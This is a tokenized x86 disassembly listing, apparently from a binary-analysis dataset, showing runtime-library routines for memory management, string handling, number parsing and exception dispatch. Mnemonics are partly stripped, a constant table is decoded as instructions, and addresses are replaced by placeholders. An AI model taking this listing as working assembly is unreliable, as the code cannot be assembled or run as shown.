cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401440
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a6c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a6c
jmp r-xdata
sub_402358
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_4024ea
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401adc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401438
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401440
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a6c
jmp r-xdata
call sub_401f70
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c80
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401ee8
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c80
sub_4024fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f70
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c80
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_402074
test al al
je r-xdata
call sub_401c80
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d44
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401ee8
jmp r-xdata
sub_4026d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_402789
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401adc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4024fc
test al al
je r-xdata
push rw-data
call sub_401438
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4021c8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_402998
mov eax ebx
call sub_402358
retn
push rw-data
call sub_401440
sub_40279c
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_4028f8
sub_4027bc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_4028f8
sub_4027dc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_4028f8
mov [ ecx ] eax
mov al 0x2
jmp sub_4028f8
retn
mov [ ecx ] eax
retn
sub_40286c
push ebx
push esi
call sub_406168
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406168
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406168
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4028ac
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406168
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4028a0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402934
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402998
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402a08
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402a48
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402924
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a9c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402924
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402924
jmp r-xdata
sub_402af4
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b30
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_402998
pop ebx
retn
mov ecx ebx
sub_402b4c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bd0
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c40
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c60
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d40
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d80
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40306c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40309c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401394
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40310d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40139c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_40138c
retn
sub_403198
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403240
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403298
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a70
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032b8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405a50
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4032e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40336c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40337c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403373
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032b8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405a50
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40337c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033c0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403460
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403400
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403430
push eax
push ecx
mov eax [ eax ]
call sub_403400
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f78
call [ rw-data ]
sub_403448
push esi
mov esi edx
mov eax [ eax ]
call sub_403400
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f78
call [ rw-data ]
sub_403490
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403400
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034b8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403508
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403558
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403581
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035ec
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403628
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40363c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403650
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403670
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403650
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036d4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406168
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40363c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035ec
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403800
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035ec
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
